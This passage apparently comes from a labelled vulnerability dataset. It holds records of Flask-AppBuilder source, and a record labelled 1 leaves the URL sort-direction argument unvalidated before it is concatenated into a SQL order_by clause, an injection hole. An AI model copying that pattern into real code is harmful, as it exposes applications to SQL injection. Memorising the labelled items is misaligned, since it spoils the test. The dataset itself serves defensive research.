is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/nflask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            order_direction = request.args.get('_od_' + re_match[0])\n            if order_direction in ('asc', 'desc'):\n                orders[re_match[0]] = (request.args.get(arg), order_direction)\n    return orders\n\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 0}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/n/flask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 1}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != 